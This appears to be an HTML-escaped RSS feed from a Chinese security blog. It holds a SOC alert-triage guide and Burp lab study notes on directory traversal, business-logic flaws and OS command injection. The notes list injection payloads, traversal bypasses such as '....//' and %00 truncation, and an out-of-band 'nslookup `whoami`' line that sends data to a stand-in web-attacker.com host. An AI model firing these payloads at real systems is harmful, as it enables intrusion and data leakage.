&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;des_type DNS 访问类型 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;host HOST&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 请求的域名信息 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr 地址资源 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNS 的 A 记录，表示该 host 对应的 IP 地址信息，可能有多个记录 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mx 邮件交换记录 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cname 域名的规范名称 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 表示该 host 域名的其它别名记录 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;5.SSL 协议字段&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;version 版本号 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SSL 的版本号 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;server_name 服务器的名称 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SSL client_hello 报文中的扩展字段，通过该字段判断客户端和哪个站点进行交互 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;issuer_name 证书颁发者名称 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;notbefore 证书有效期起始时间 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;notafter 证书有效期起始时间 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public_key 证书公钥 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;user_name Server 端的证书使用者 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;
&lt;p&gt;文件传输协议字段&lt;br /&gt;
 proto; trans_mode; file_name; file_md5; mimie_tupe; uri; host; referer; status; file_dir; mothod&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;登录协议字段&lt;br /&gt;
 proto; passwd; info; user; db_type; normal_ret&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;邮件协议&lt;br /&gt;
 proto; time; from; to; cc; subject; references; attach_name; attach_md5; mime_type; plain&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;数据库操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库操作&#34;&gt;#&lt;/a&gt; 数据库操作&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;数据库查询字段&lt;br /&gt;
 proto; version; user; db_name; db_type; ret_code; sql_info&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;web-攻击处理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-攻击处理&#34;&gt;#&lt;/a&gt; web 攻击处理&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;备份文件&lt;br /&gt;
下载对应备份文件，分析并判断影响，是否删除对应文件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;自动目录列表&lt;br /&gt;
响应体中的 “Directory” 会出发警告，此时应该访问对应文件，分析目录信息，判断影响，修改配置文件，禁止目录列表列出。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目录穿越&lt;br /&gt;
请求头包含../../ 触发警告，应该对输入参数进行过滤。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;4.svn 源码泄露&lt;br /&gt;
 URL“/.svn/entries” 与响应体 svn 信息触发规则告警，应禁止或删除.svn 文件。&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;弱口令&lt;br /&gt;
查看是否包含返回成功的字段或数据，溯源 sip 或自己登录尝试，例如 tomcat 与 basic 认证弱口令信息在 Authorization 中，可用 base64 解密。&lt;br /&gt;
根据流量分析暴力破解行文，以下是一些常见的筛选语句：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HTTP 登录爆破，协议类型 web 日志：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sip:(&amp;quot;ip&amp;quot;) AND dip:(&amp;quot;ip&amp;quot;) AND data:(&amp;quot; 账号 &amp; quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;FTP,SMTP,Telnet,SSH,mysql 数据库等登录爆破，协议登录动作：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sip:(&amp;quot;ip&amp;quot;) AND dip:(&amp;quot;ip&amp;quot;) AND proto:(&amp;quot; 爆破协议 &amp; quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 过滤爆破登录成功：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sip:(&amp;quot;ip&amp;quot;) AND dip:(&amp;quot;ip&amp;quot;) AND proto:(&amp;quot; 爆破协议 &amp; quot;) AND NOT （info:fail* OR info:530）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss&#34;&gt;#&lt;/a&gt; XSS&lt;/h2&gt;
&lt;p&gt;检查是否存在 xss 的 payload，看是否存在实体化。&lt;/p&gt;
&lt;h2 id=&#34;sql-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h2&gt;
&lt;p&gt;检查数据库是否返回相应信息，根据返回页面长度判断是否注入成功，根据网站延时判断注入是否成功。基本都是根据相应时间，响应头，响应体判断。&lt;/p&gt;
&lt;h2 id=&#34;文件上传&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件上传&#34;&gt;#&lt;/a&gt; 文件上传&lt;/h2&gt;
&lt;p&gt;首先判断是否存在危险文件上传，再根据返回信息判断是否上传成功。&lt;br /&gt;
检查语法：uri:(&amp;quot;文件名&amp;quot;)&lt;/p&gt;
&lt;h2 id=&#34;文件包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件包含&#34;&gt;#&lt;/a&gt; 文件包含&lt;/h2&gt;
&lt;p&gt;检查响应体&lt;/p&gt;
&lt;h2 id=&#34;webshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#webshell&#34;&gt;#&lt;/a&gt; webshell&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;哥斯拉通信：上下文流量分析。&lt;/li&gt;
&lt;li&gt;冰蝎：密钥协商，加密传输。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;命令执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令执行&#34;&gt;#&lt;/a&gt; 命令执行&lt;/h2&gt;
&lt;p&gt;同前文。&lt;/p&gt;
&lt;h2 id=&#34;网络攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络攻击&#34;&gt;#&lt;/a&gt; 网络攻击&lt;/h2&gt;
&lt;p&gt;看载荷，看是否有外接系统&lt;/p&gt;
&lt;h2 id=&#34;小结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#小结&#34;&gt;#&lt;/a&gt; 小结&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;企图报警也要看&lt;/li&gt;
&lt;li&gt;告警分析核心要素：请求与相应&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;威胁情报&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#威胁情报&#34;&gt;#&lt;/a&gt; 威胁情报&lt;/h1&gt;
&lt;h2 id=&#34;远控木马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#远控木马&#34;&gt;#&lt;/a&gt; 远控木马&lt;/h2&gt;
&lt;p&gt;根据 IOC 信息查询，查询是否有主机访问对应 URL。&lt;/p&gt;
&lt;h2 id=&#34;挖矿木马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#挖矿木马&#34;&gt;#&lt;/a&gt; 挖矿木马&lt;/h2&gt;
&lt;p&gt;查看流量日志是否存在挖矿流量，检测链接是否存活&lt;/p&gt;
&lt;h2 id=&#34;勒索病毒&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#勒索病毒&#34;&gt;#&lt;/a&gt; 勒索病毒&lt;/h2&gt;
&lt;p&gt;是否存在大量恶意域名请求，自身是否存在漏洞，检测是否存在横向传播，奇安信有检测平台&lt;/p&gt;
&lt;h2 id=&#34;小结-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#小结-2&#34;&gt;#&lt;/a&gt; 小结&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;流程：确认告警信息，分析威胁情报，匹配网络攻击行为，是否存在交互信息。&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/12/22/cybersecurity/BurpLab-3/</guid>
            <title>BurpLab_3-Directory_traversal</title>
            <link>http://ericcd.com/2022/12/22/cybersecurity/BurpLab-3/</link>
            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一个简单特点&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;/loadImage?filename=1.png&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;有的服务器会禁止使用相对地址，可以尝试使用绝对地址。&lt;/li&gt;
&lt;li&gt;有的会替换掉一些关键字符，试着用....// 或 ..../ 绕过。&lt;/li&gt;
&lt;li&gt;爆破&lt;/li&gt;
&lt;li&gt;有的要求固定文件路径开头&lt;/li&gt;
&lt;li&gt;有的要求以特定格式（比如.png）结尾，用 %00 做截断。&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/12/22/cybersecurity/BurpLab-5/</guid>
            <title>BurpLab_5-Business_logic_vulnerabilities</title>
            <link>http://ericcd.com/2022/12/22/cybersecurity/BurpLab-5/</link>
            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;excessive-trust-in-client-side-controls&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#excessive-trust-in-client-side-controls&#34;&gt;#&lt;/a&gt; Excessive trust in client-side controls&lt;/h1&gt;
&lt;h1 id=&#34;failing-to-handle-unconventional-input&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#failing-to-handle-unconventional-input&#34;&gt;#&lt;/a&gt; Failing to handle unconventional input&lt;/h1&gt;
&lt;p&gt;1.Are there any limits that are imposed on the data?&lt;br /&gt;
2.What happens when you reach those limits?&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzMuSXM=&#34;&gt;3.Is&lt;/span&gt; any transformation or normalization being performed on your input?&lt;br /&gt;
4. 注意边界值和特殊值&lt;br /&gt;
 5. 有后端前端不会检测用户输入的长度，后端也只是做了简单的截断处理，可以摸清后端的阶段规律，自定义一个适当长度的字符串，让它被阶段后成为我们的目标字符串&lt;/p&gt;
&lt;h1 id=&#34;making-flawed-assumptions-about-user-behavior&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#making-flawed-assumptions-about-user-behavior&#34;&gt;#&lt;/a&gt; Making flawed assumptions about user behavior&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;When probing for logic flaws, you should try removing each parameter in turn and observing what effect this has on the response. You should make sure to:&lt;/p&gt;
&lt;p&gt;a. Only remove one parameter at a time to ensure all relevant code paths are reached.&lt;br /&gt;
b. Try deleting the name of the parameter as well as the value. The server will typically handle both cases differently.&lt;br /&gt;
c. Follow multi-stage processes through to completion. Sometimes tampering with a parameter in one step will have an effect on another step further along in the workflow.&lt;/p&gt;
&lt;h1 id=&#34;domain-specific-flaws&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#domain-specific-flaws&#34;&gt;#&lt;/a&gt; Domain-specific flaws&lt;/h1&gt;
&lt;p&gt;1。利用优惠码的刷新漏洞重复使用同一个优惠码&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/12/22/cybersecurity/BurpLab-4/</guid>
            <title>BurpLab_4-OS_command_injection</title>
            <link>http://ericcd.com/2022/12/22/cybersecurity/BurpLab-4/</link>
            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;executing-arbitrary-commands&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#executing-arbitrary-commands&#34;&gt;#&lt;/a&gt; Executing arbitrary commands&lt;/h1&gt;
&lt;p&gt;最基础的 payload&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; echo aiwefwlguh &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1|whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
2. 常用指令&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 应用                      Linux          Windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 用户名                  whoami         whoami&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 操作系统              uname -a       ver&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 网络设置              ifconfig              ipconfig /all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 网络连接              netstat -an         netstat -an&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 进程                     ps -ef          tasklist&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;detecting-blind-os-command-injection-using-time-delays&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#detecting-blind-os-command-injection-using-time-delays&#34;&gt;#&lt;/a&gt; Detecting blind OS command injection using time delays&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; ping -c 10 127.0.0.1 &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|ping+-c+10+127.0.0.1||&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;exploiting-blind-os-command-injection-by-redirecting-output&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exploiting-blind-os-command-injection-by-redirecting-output&#34;&gt;#&lt;/a&gt; Exploiting blind OS command injection by redirecting output&lt;/h1&gt;
&lt;p&gt;配合目录穿越使用&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; whoami &amp;gt; /var/www/static/whoami.txt &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;exploiting-blind-os-command-injection-using-out-of-band-oast-techniques&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exploiting-blind-os-command-injection-using-out-of-band-oast-techniques&#34;&gt;#&lt;/a&gt; Exploiting blind OS command injection using out-of-band (OAST) techniques&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; nslookup kgji2ohoyw.web-attacker.com &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; nslookup `whoami`.kgji2ohoyw.web-attacker.com &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;ways-of-injecting-os-commands&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ways-of-injecting-os-commands&#34;&gt;#&lt;/a&gt; Ways of injecting OS commands&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;仅 Unix 系统下使用的分隔符：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Newline (0x0a or \n)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 还可以通过以下方式执行命令:&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;`injected command`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$(injected command )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/12/22/cybersecurity/BurpLab-2/</guid>
            <title>BurpLab_2-Authentication</title>
            <link>http://ericcd.com/2022/12/22/cybersecurity/BurpLab-2/</link>
            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;authentication-vulnerabilities&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#authentication-vulnerabilities&#34;&gt;#&lt;/a&gt; Authentication vulnerabilities&lt;/h1&gt;
&lt;h2 id=&#34;vulnerabilities-in-password-based-login&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vulnerabilities-in-password-based-login&#34;&gt;#&lt;/a&gt; Vulnerabilities in password-based login&lt;/h2&gt;
&lt;h3 id=&#34;brute-force-attacks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#brute-force-attacks&#34;&gt;#&lt;/a&gt; Brute-force attacks&lt;/h3&gt;
&lt;h4 id=&#34;username-enumeration&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#username-enumeration&#34;&gt;#&lt;/a&gt; Username enumeration&lt;/h4&gt;
&lt;p&gt;1.Status codes&lt;br /&gt;
2.Error messages&lt;br /&gt;
3.Response times&lt;br /&gt;
